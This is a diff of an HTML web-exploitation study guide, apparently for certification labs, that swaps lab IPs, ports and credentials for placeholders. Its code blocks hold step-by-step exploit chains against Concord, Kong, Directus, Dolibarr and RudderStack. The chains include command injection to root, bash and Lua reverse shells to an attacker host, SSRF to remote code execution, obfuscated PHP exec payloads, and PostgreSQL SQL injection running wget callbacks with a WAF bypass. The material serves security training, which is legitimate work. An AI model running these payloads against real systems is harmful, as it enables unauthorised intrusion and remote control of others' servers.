-./check_http -I [attacker-ip] -p 8080 -k 'test -c 'id'
+./check_http -I [attacker-ip] -p [port] -k 'test -c 'id'
 # Output: uid=0(root) gid=0(root) groups=0(root),999(nagios)
 
 # Reverse shell
-./check_http -I [attacker-ip] -p 8080 -k 'test -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/4444 0&gt;&amp;1'</code></pre>
+./check_http -I [attacker-ip] -p [port] -k 'test -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1'</code></pre>
 
 <p>The injection works because the <code>su -c</code> command uses single quotes to encapsulate user input. By providing our own single quote, we close the original encapsulation and inject a second <code>-c</code> argument, which <code>su</code> processes instead of the first, giving us arbitrary command execution as root.</p>
 
@@ -5074,7 +5074,7 @@ https://[target-ip]/js/vendor/lodash/perf/index.html?build=https://[attacker-ip]
     <pre><code class="language-bash">python3 wsclient.py --url wss://[target-ip]/sudo_server -k [akey]</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-9-9"> Exploit single-quote injection in <code>check_http -k</code> to escape <code>su -c</code> and execute arbitrary commands</label>
-    <pre><code class="language-bash">./check_http -I [attacker-ip] -p 8080 -k 'test -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/4444 0&gt;&amp;1'</code></pre>
+    <pre><code class="language-bash">./check_http -I [attacker-ip] -p [port] -k 'test -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1'</code></pre>
   </li>
 </ul>
 
@@ -5094,7 +5094,7 @@ https://[target-ip]/js/vendor/lodash/perf/index.html?build=https://[attacker-ip]
 <thead><tr><th>URL</th><th>Username</th><th>Password</th></tr></thead>
 <tbody>
 <tr><td><code>http://concord:8001/</code></td><td colspan="2">(web UI)</td></tr>
-<tr><td><code>ssh://concord</code></td><td>student</td><td>studentlab</td></tr>
+<tr><td><code>ssh://[target-hostname]</code></td><td>[username]</td><td>[password]</td></tr>
 </tbody>
 </table>
 
@@ -5117,7 +5117,7 @@ curl http://[target-ip]:[port]/swagger.json</code></pre>
   </li>
   <li><label><input type="checkbox"> Check Set-Cookie headers for SameSite, Secure, and HttpOnly attributes</label></li>
   <li><label><input type="checkbox"> Download source code via SSH or rsync for whitebox analysis</label>
-    <pre><code class="language-bash">rsync -az student@[target-ip]:/home/student/[app-dir]/ ./[app-dir]/</code></pre>
+    <pre><code class="language-bash">rsync -az [username]@[target-ip]:/home/[username]/[app-dir]/ ./[app-dir]/</code></pre>
   </li>
 </ul>
 
@@ -5336,15 +5336,15 @@ function rce() {
 sudo python3 -m http.server 80
 
 # Start listener for reverse shell
-nc -nvlp 9000</code></pre>
+nc -nvlp [listener-port]</code></pre>
 
 <pre><code class="language-bash"># Callback received in HTTP server logs
-192.168.121.253 - - "GET /?msg={...\"username\":\"concordAgent\"...} HTTP/1.1" 200 -
-192.168.121.253 - - "GET /?msg={\"instanceId\":\"a85f6fef-...\",\"ok\":true} HTTP/1.1" 200 -
+[attacker-ip] - - "GET /?msg={...\"username\":\"concordAgent\"...} HTTP/1.1" 200 -
+[attacker-ip] - - "GET /?msg={\"instanceId\":\"a85f6fef-...\",\"ok\":true} HTTP/1.1" 200 -
 
 # Reverse shell
-nc -nvlp 9000
-connect to [[attacker-ip]] from (UNKNOWN) [target-ip] 39888
+nc -nvlp [listener-port]
+connect to [attacker-ip] from (UNKNOWN) [target-ip] 39888
 whoami
 concord</code></pre>
 
@@ -5470,7 +5470,7 @@ print(f"[*] Process response: {r.text}")</code></pre>
   <li><label><input type="checkbox" data-id="oswe-10-4"> Identify API endpoints that accept standard POST content types (multipart/form-data)</label></li>
   <li><label><input type="checkbox" data-id="oswe-10-5"> Build CSRF page: check auth via whoami, then submit malicious concord.yml process</label></li>
   <li><label><input type="checkbox" data-id="oswe-10-6"> Download source code and review database migration files for hardcoded credentials</label>
-    <pre><code class="language-bash">rsync -az student@concord:/home/student/concord-1.83.0/ concord/
+    <pre><code class="language-bash">rsync -az [username]@[target-hostname]:/home/[username]/concord-1.83.0/ concord/
 grep -rl '&lt;insert tableName="API_KEYS"&gt;' ./</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-10-7"> Test commented "original" API key values against the Authorization header</label>
@@ -5499,7 +5499,7 @@ grep -rl '&lt;insert tableName="API_KEYS"&gt;' ./</code></pre>
 <thead><tr><th>Component</th><th>Details</th></tr></thead>
 <tbody>
 <tr><td>Target URL</td><td><code>http://apigateway:8000/</code></td></tr>
-<tr><td>SSH Access</td><td><code>student:studentlab</code></td></tr>
+<tr><td>SSH Access</td><td><code>[username]:[password]</code></td></tr>
 <tr><td>API Gateway</td><td>Kong 2.2.1</td></tr>
 <tr><td>Backend Service</td><td>Directus v9.0.0-rc34</td></tr>
 <tr><td>Approach</td><td>Blackbox (no application credentials)</td></tr>
@@ -5510,7 +5510,7 @@ grep -rl '&lt;insert tableName="API_KEYS"&gt;' ./</code></pre>
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> SSH into the target and review the Docker container layout and internal network topology</label>
-<pre><code class="language-bash">ssh student@[target-ip]
+<pre><code class="language-bash">ssh [username]@[target-ip]
 docker ps
 docker network ls
 docker network inspect [network-name]</code></pre></li>
@@ -5808,7 +5808,7 @@ curl -X POST -H "Content-Type: application/json" \
 
 # Timing: unreachable host (~60s)
 curl -X POST -H "Content-Type: application/json" \
-  -d '{"url":"http://10.66.66.66"}' \
+  -d '{"url":"http://[internal-ip]"}' \
   http://[target-ip]:8000/files/import -s -w 'Total: %{time_total}s\n' -o /dev/null
 # Total: 60.155041s</code></pre>
 
@@ -6066,11 +6066,11 @@ curl "http://[target-ip]:8000/render?url=file:///etc/passwd&amp;apikey=SBzrCb94o
 
 <h4 id="oswe-ssrf-lua-payload">11.9.1 Generating the Lua Payload</h4>
 <pre><code class="language-bash"># Generate a Lua reverse shell with msfvenom
-msfvenom -p cmd/unix/reverse_lua lhost=[attacker-ip] lport=8888 -f raw -o shell.lua
+msfvenom -p cmd/unix/reverse_lua lhost=[attacker-ip] lport=[listener-port] -f raw -o shell.lua
 
 # Output (remove "lua -e" prefix for plugin use):
 # local s=require('socket');local t=assert(s.tcp());
-# t:connect('[attacker-ip]',8888);while true do
+# t:connect('[attacker-ip]',[listener-port]);while true do
 # local r,x=t:receive();local f=assert(io.popen(r,'r'));
 # local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();</code></pre>
 
@@ -6110,7 +6110,7 @@ function createPlugin() {
             "name": "pre-function",
             "config": {
                 "access": [
-                    "local s=require('socket');local t=assert(s.tcp());t:connect('[attacker-ip]',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
+                    "local s=require('socket');local t=assert(s.tcp());t:connect('[attacker-ip]',[listener-port]);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
                 ]
             }
         })
@@ -6127,7 +6127,7 @@ function createPlugin() {
 
 <h4 id="oswe-ssrf-rce-trigger">11.9.3 Delivering and Triggering the Exploit</h4>
 <pre><code class="language-bash"># 1. Start a netcat listener
-nc -nvlp 8888
+nc -nvlp [listener-port]
 
 # 2. Deliver the RCE payload via SSRF chain
 curl -X POST -H "Content-Type: application/json" \
@@ -6142,8 +6142,8 @@ sudo tail /var/log/apache2/access.log
 curl -i http://[target-ip]:8000/supersecret</code></pre>
 
 <pre><code class="language-bash"># Reverse shell received!
-nc -nvlp 8888
-# connect to [[attacker-ip]] from (UNKNOWN) [[target-internal-ip]] 41764
+nc -nvlp [listener-port]
+# connect to [attacker-ip] from (UNKNOWN) [target-internal-ip] 41764
 whoami
 # kong
 ls -al
@@ -6196,7 +6196,7 @@ ls -al
   <li><label><input type="checkbox" data-id="oswe-11-9"> Exfiltrate API keys or credentials from internal admin APIs</label></li>
   <li><label><input type="checkbox" data-id="oswe-11-10"> Chain to RCE via Kong pre-function plugin (Lua reverse shell)</label>
     <pre><code class="language-bash"># Generate Lua payload
-msfvenom -p cmd/unix/reverse_lua lhost=[attacker-ip] lport=8888 -f raw
+msfvenom -p cmd/unix/reverse_lua lhost=[attacker-ip] lport=[listener-port] -f raw
 # Trigger after plugin setup
 curl http://[target-ip]:8000/supersecret</code></pre>
   </li>
@@ -6222,7 +6222,7 @@ curl http://[target-ip]:8000/supersecret</code></pre>
 <tr><td>Approach</td><td>Whitebox (source review) + Blackbox (crash-based detection)</td></tr>
 <tr><td>Template Engines</td><td>EJS, Handlebars (hbs), Pug — selectable via <code>TEMPLATING_ENGINE</code> env var</td></tr>
 <tr><td>URL</td><td><code>http://chips/</code></td></tr>
-<tr><td>SSH</td><td><code>student:studentlab</code></td></tr>
+<tr><td>SSH</td><td><code>[username]:[password]</code></td></tr>
 </tbody>
 </table>
 
@@ -6302,12 +6302,12 @@ services:
 <p>The <code>TEMPLATING_ENGINE</code> environment variable controls which engine is used. Set it before <code>docker-compose up</code> to switch engines.</p>
 
 <pre><code class="language-bash"># Switch to EJS
-student@chips:~/chips$ docker-compose down
-student@chips:~/chips$ TEMPLATING_ENGINE=ejs docker-compose up
+[username]@[target-hostname]:~/[app-dir]$ docker-compose down
+[username]@[target-hostname]:~/[app-dir]$ TEMPLATING_ENGINE=ejs docker-compose up
 
 # Switch to Handlebars
-student@chips:~/chips$ docker-compose down
-student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose up</code></pre>
+[username]@[target-hostname]:~/[app-dir]$ docker-compose down
+[username]@[target-hostname]:~/[app-dir]$ TEMPLATING_ENGINE=hbs docker-compose up</code></pre>
 
 
 <h4>Methodology</h4>
@@ -7067,7 +7067,7 @@ npm audit</code></pre>
     <pre><code class="language-bash">curl http://[target-ip]/</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-12-8"> Obtain reverse shell</label>
-    <pre><code class="language-bash">nc -nvlp 9000</code></pre>
+    <pre><code class="language-bash">nc -nvlp [listener-port]</code></pre>
   </li>
 </ul>
 
@@ -7450,14 +7450,14 @@ get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"),
 <p>Replace the <code>whoami</code> command with a bash reverse shell. Start a Netcat listener, then update the Computed field and navigate to the Users list to trigger the payload.</p>
 
 <pre><code class="language-bash"># Start listener on attacker machine
-nc -nvlp 9090</code></pre>
+nc -nvlp [listener-port]</code></pre>
 
 <pre><code class="language-php">// Reverse shell payload (Computed field value)
 get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"),
-    get_defined_functions()['internal'])]("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/9090 0&gt;&amp;1'");</code></pre>
+    get_defined_functions()['internal'])]("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1'");</code></pre>
 
 <pre><code class="language-bash"># Reverse shell received
-listening on [any] 9090 ..
+listening on [any] [listener-port] ..
 www-data@dolibarr:/usr/share/dolibarr/htdocs/user/admin$ whoami
 www-data</code></pre>
 
@@ -7479,8 +7479,8 @@ www-data</code></pre>
   <li><label><input type="checkbox" data-id="oswe-13-7"> Inject payload via admin Computed Field feature at <code>/user/admin/user_extrafields.php</code></label></li>
   <li><label><input type="checkbox" data-id="oswe-13-8"> Navigate to Users list to trigger <code>showOutputField()</code> and verify RCE</label></li>
   <li><label><input type="checkbox" data-id="oswe-13-9"> Upgrade to reverse shell via bash TCP redirect</label>
-    <pre><code class="language-bash">nc -nvlp 9090
-# Payload: /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/9090 0&gt;&amp;1'</code></pre>
+    <pre><code class="language-bash">nc -nvlp [listener-port]
+# Payload: /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1'</code></pre>
   </li>
 </ul>
 
@@ -7507,7 +7507,7 @@ www-data</code></pre>
 <p>The RudderStack VM runs multiple Docker containers: <code>student_caddy_1</code> (Coraza WAF on port 80), <code>student_backend_1</code> (RudderStack on port 8080), and <code>student_db_1</code> (PostgreSQL on port 6432). The application is accessible directly on port 8080 or through the WAF on port 80. Source code is available via code-server on port 8000.</p>
 
 <pre><code class="language-bash"># Add host entry
-echo "192.168.120.144  rudderstack" | sudo tee -a /etc/hosts
+echo "[attacker-ip]  [target-hostname]" | sudo tee -a /etc/hosts
 
 # List running Docker containers
 docker ps
@@ -7530,7 +7530,7 @@ docker exec -it student_db_1 /bin/sh</code></pre>
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Add the target hostname to <code>/etc/hosts</code></label>
-<pre><code class="language-bash">echo "192.168.120.144  rudderstack" | sudo tee -a /etc/hosts</code></pre></li>
+<pre><code class="language-bash">echo "[attacker-ip]  [target-hostname]" | sudo tee -a /etc/hosts</code></pre></li>
 <li><label><input type="checkbox"> Enumerate running Docker containers and identify services</label>
 <pre><code class="language-bash">docker ps</code></pre></li>
 <li><label><input type="checkbox"> Access the source code via code-server at <code>http://rudderstack:8000</code></label></li>
@@ -7692,7 +7692,7 @@ func getPendingStagingFileCount(sourceOrDestId string, isSourceId bool) (fileCou
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Identify the expected request format from the <code>PendingEventsRequestT</code> struct in <code>warehouse/utils/utils.go</code></label></li>
 <li><label><input type="checkbox"> Send a valid JSON request to confirm unauthenticated access returns HTTP 200</label>
-<pre><code class="language-bash">curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+<pre><code class="language-bash">curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"test","task_run_id":"1"}'</code></pre></li>
 <li><label><input type="checkbox"> Trace the <code>source_id</code> parameter from the handler through to the SQL query in <code>getPendingStagingFileCount()</code></label></li>
@@ -7706,7 +7706,7 @@ func getPendingStagingFileCount(sourceOrDestId string, isSourceId bool) (fileCou
 <p>Inject a single quote in the <code>source_id</code> to break the SQL syntax. The application returns an HTTP 500 with a verbose error message containing the malformed SQL statement and <code>pq: unterminated quoted string</code>, confirming the vulnerability and revealing PostgreSQL as the database.</p>
 
 <pre><code class="language-bash"># Confirm SQLi with single quote
-curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"'\''","task_run_id":"1"}'
 # Response: 500 Internal Server Error
@@ -7716,7 +7716,7 @@ curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUplo
 <p>PostgreSQL supports stacked queries separated by semicolons. Inject a second valid SQL statement to verify the database processes it. An HTTP 200 response with no error confirms stacked query execution.</p>
 
 <pre><code class="language-bash"># Test stacked query injection
-curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"1; select 2 FROM wh_uploads; -- -","task_run_id":"1"}'
 # Response: 200 OK</code></pre>
@@ -7734,18 +7734,18 @@ curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUplo
 </table>
 
 <pre><code class="language-bash"># Start HTTP server to catch the callback
-python3 -m http.server 9000</code></pre>
+python3 -m http.server [http-port]</code></pre>
 
 <pre><code class="language-bash"># RCE via COPY TO PROGRAM
-curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
-  -d "{\"source_id\":\"'; copy (select 'a') to program 'wget -q http://[attacker-ip]:9000/it_worked' -- -\",\"task_run_id\":\"1\"}"
+  -d "{\"source_id\":\"'; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/it_worked' -- -\",\"task_run_id\":\"1\"}"
 # Response: 500 (wget returns non-zero exit code)</code></pre>
 
 <pre><code class="language-bash"># Verify callback on attacker HTTP server
-Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
-192.168.120.144 - - [29/Feb/2024 15:26:01] code 404, message File not found
-192.168.120.144 - - [29/Feb/2024 15:26:01] "GET /it_worked HTTP/1.1" 404 -</code></pre>
+Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
+[attacker-ip] - - [29/Feb/2024 15:26:01] code 404, message File not found
+[attacker-ip] - - [29/Feb/2024 15:26:01] "GET /it_worked HTTP/1.1" 404 -</code></pre>
 
 <p>The HTTP 500 from the application is expected — <code>wget</code> returns a non-zero exit code since the file doesn't exist on the attacker server. The callback on the attacker's HTTP server confirms OS command execution on the target.</p>
 
@@ -7753,19 +7753,19 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Inject a single quote in <code>source_id</code> to confirm SQL injection</label>
-<pre><code class="language-bash">curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+<pre><code class="language-bash">curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"'\''","task_run_id":"1"}'</code></pre></li>
 <li><label><input type="checkbox"> Confirm PostgreSQL from the <code>pq:</code> error prefix in the response</label></li>
 <li><label><input type="checkbox"> Test stacked query support by injecting a valid second SQL statement</label>
-<pre><code class="language-bash">curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+<pre><code class="language-bash">curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"1; select 2 FROM wh_uploads; -- -","task_run_id":"1"}'</code></pre></li>
 <li><label><input type="checkbox"> Achieve RCE via PostgreSQL <code>COPY TO PROGRAM</code> with a callback to an attacker-controlled HTTP server</label>
-<pre><code class="language-bash">python3 -m http.server 9000 &
-curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+<pre><code class="language-bash">python3 -m http.server [http-port] &
+curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
-  -d "{\"source_id\":\"'; copy (select 'a') to program 'wget -q http://[attacker-ip]:9000/rce_confirmed' -- -\",\"task_run_id\":\"1\"}"</code></pre></li>
+  -d "{\"source_id\":\"'; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/rce_confirmed' -- -\",\"task_run_id\":\"1\"}"</code></pre></li>
 <li><label><input type="checkbox"> Repeat the exploit through the WAF on port 80 and observe the HTTP 403 block</label></li>
 <li><label><input type="checkbox"> Analyze WAF rules to identify which CRS rule triggers the block</label>
 <pre><code class="language-bash">docker exec student_caddy_1 cat /coraza/crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf | grep -A5 "942540"</code></pre></li>
@@ -7789,7 +7789,7 @@ docker logs -n 5 student_caddy_1</code></pre>
 <pre><code class="language-bash"># Payload blocked by WAF (via port 80)
 curl -s -o /dev/null -w "%{http_code}" -X POST "http://[target-ip]:80/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
-  -d "{\"source_id\":\"'; copy (select 'a') to program 'wget -q http://[attacker-ip]:9000/it_worked' -- -\",\"task_run_id\":\"1\"}"
+  -d "{\"source_id\":\"'; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/it_worked' -- -\",\"task_run_id\":\"1\"}"
 # Response: 403 Forbidden</code></pre>
 
 <pre><code class="language-bash"># Single quote alone passes through WAF
@@ -7852,13 +7852,13 @@ SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAME
 <pre><code class="language-bash"># WAF bypass payload
 curl -s -X POST "http://[target-ip]:80/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
-  -d "{\"source_id\":\"' or 1=2; copy (select 'a') to program 'wget -q http://[attacker-ip]:9000/it_will_bypass' -- -\",\"task_run_id\":\"1\"}"
+  -d "{\"source_id\":\"' or 1=2; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/it_will_bypass' -- -\",\"task_run_id\":\"1\"}"
 # Response: 500 Internal Server Error (NOT 403 - WAF bypassed)</code></pre>
 
 <pre><code class="language-bash"># Confirm callback received on attacker HTTP server
-Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
-192.168.120.144 - - [29/Feb/2024 15:44:44] code 404, message File not found
-192.168.120.144 - - [29/Feb/2024 15:44:44] "GET /it_will_bypass HTTP/1.1" 404 -</code></pre>
+Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
+[attacker-ip] - - [29/Feb/2024 15:44:44] code 404, message File not found
+[attacker-ip] - - [29/Feb/2024 15:44:44] "GET /it_will_bypass HTTP/1.1" 404 -</code></pre>
 
 <p>No WAF block, and the callback landed — the modified payload evades rule 942540 while still executing through the SQL injection.</p>
 
@@ -7874,24 +7874,24 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
   <li><label><input type="checkbox" data-id="oswe-14-3"> Determine request format from source code (struct definitions, content type)</label></li>
   <li><label><input type="checkbox" data-id="oswe-14-4"> Identify SQL construction patterns: <code>fmt.Sprintf()</code> vs parameterized queries</label></li>
   <li><label><input type="checkbox" data-id="oswe-14-5"> Confirm SQLi with single quote injection and analyze error messages</label>
-    <pre><code class="language-bash">curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+    <pre><code class="language-bash">curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"'\''","task_run_id":"1"}'</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-14-6"> Test stacked queries for PostgreSQL</label>
-    <pre><code class="language-bash">curl -s -X POST "http://[target-ip]:8080/v1/warehouse/pending-events?triggerUpload=true" \
+    <pre><code class="language-bash">curl -s -X POST "http://[target-ip]:[port]/v1/warehouse/pending-events?triggerUpload=true" \
   -H "Content-Type: application/json" \
   -d '{"source_id":"1; select 2 FROM wh_uploads; -- -","task_run_id":"1"}'</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-14-7"> Achieve RCE via PostgreSQL <code>COPY TO PROGRAM</code></label>
-    <pre><code class="language-sql">'; copy (select 'a') to program 'wget -q http://[attacker-ip]:9000/test' -- -</code></pre>
+    <pre><code class="language-sql">'; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/test' -- -</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-14-8"> If WAF blocks payload, check WAF logs to identify the triggering rule</label>
     <pre><code class="language-bash">docker logs -n 20 student_caddy_1</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-14-9"> Analyze the WAF rule regex and test bypass payloads on regex101</label></li>
   <li><label><input type="checkbox" data-id="oswe-14-10"> Modify payload to evade WAF: separate quote from semicolon with valid SQL</label>
-    <pre><code class="language-sql">' or 1=2; copy (select 'a') to program 'wget -q http://[attacker-ip]:9000/bypass' -- -</code></pre>
+    <pre><code class="language-sql">' or 1=2; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/bypass' -- -</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-14-11"> Verify callback on attacker HTTP server to confirm WAF bypass and RCE</label></li>
 </ul>
